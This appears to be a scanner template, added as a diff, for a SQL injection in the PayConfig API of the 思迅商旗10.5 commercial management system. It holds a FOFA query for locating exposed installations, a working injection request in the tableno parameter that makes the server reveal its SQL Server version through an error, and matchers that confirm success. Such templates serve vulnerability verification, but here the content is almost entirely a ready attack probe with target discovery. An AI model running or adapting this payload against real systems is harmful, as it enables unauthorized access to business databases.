@@ -1,0 +1,25 @@
+## id: VEID-2026-11112
+## name: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 思迅商旗10.5商业管理系统
+## fofa-query: body="OnlineLogin.aspx"
+## verification: true
+
+
+
+GET /api/Dinner/PayConfig?branchno&tableno=1'+or+1=@@VERSION--&uuid HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+X-Requested-With: XMLHttpRequest
+
+
+#@ condition: and
+#@ matcher: body contains "Microsoft SQL Server" || body contains "转换成数据类型 int 时失败"
+#@ matcher: status_code == 200
+
+
+
+# @VEIL-STAMP: 0ac9ae4ab29dcf6b2bd6f232d9853a4993e5236c4267d6a65b8148d8e9f515ef
